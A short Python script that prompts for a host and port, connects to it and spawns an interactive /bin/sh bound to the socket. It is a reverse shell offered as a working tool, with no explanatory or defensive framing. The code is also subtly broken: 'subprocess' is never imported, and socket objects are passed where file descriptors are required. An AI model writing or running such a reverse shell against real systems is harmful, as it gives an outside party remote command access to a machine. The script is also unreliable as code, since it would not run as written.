import socket

def start_client():
    # Ask the user for the address and port to connect to
    server_address = input('Enter the address to connect to: ')
    server_port = int(input('Enter the port to connect to: '))

    # Create a TCP/IP socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect the socket to a specific address and port
    print('Connecting to %s port %s' % (server_address, server_port))
    client_socket.connect((server_address, server_port))

    # Start a remote shell
    subprocess.call(['/bin/sh', '-i'], stdin=client_socket, stdout=client_socket, stderr=client_socket)

    # Clean up the connection
    client_socket.close()
    print('Connection closed.')

if __name__ == '__main__':
    start_client()